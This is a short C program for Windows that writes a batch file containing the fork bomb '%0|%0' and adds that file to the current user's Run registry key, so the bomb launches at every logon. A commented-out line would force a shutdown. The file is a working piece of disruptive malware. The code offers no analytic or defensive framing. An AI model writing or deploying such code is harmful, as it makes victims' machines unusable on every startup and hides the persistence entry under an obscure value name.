#include <stdio.h>
#include <string.h>
#include <windows.h>
char arg[8080];
int len;
int writeinreg()
{
    const char *Register = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, Register, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS)
    {
        RegSetValueExA(hKey, "???", 0, REG_SZ, (BYTE *)arg, strlen(arg));
        RegCloseKey(hKey);
        // printf("succeed!\n");
        return 1;
    }
    // printf("Failed!");
    return -1;
}
int main(int argc, char *argv[])
{
    //-------------------------buile bat
    freopen(".bat", "w", stdout);
    const char *code = "%0|%0";
    printf("%s",code);
    freopen("CON", "w", stdout);
    //-------------------------build dir
    strcpy(arg, *argv);
    len = strlen(arg);
    for (int i = len; i > 0; i--)
    {
        if (arg[i] == '\\')
        {
            len = i;
            break;
        }
        else
            arg[i] = 0;
    }
    const char *a = ".bat";
    strcat(arg, a);
    //-------------------------write in reg
    writeinreg();
    //-------------------------restart
    // system("shutdown -f -p");
    return 0;
}